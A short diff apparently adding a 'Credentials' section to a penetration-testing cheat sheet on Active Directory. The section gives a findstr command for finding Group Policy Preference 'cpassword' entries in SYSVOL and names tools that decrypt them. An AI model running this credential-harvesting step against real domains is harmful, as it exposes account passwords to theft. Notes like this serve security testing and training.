@@ -1,3 +1,13 @@
+# Credentials
+
+Searching for GPP passwords
+
+> can be run from any machine in domain
+```
+findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policy\*. xml
+```
+it's a string encoded in AES256 with well known key. To decrypt use gpp-decrypt tool or use metasploit smb_enum_gpp module
+
 
 # Kerberoasting
 
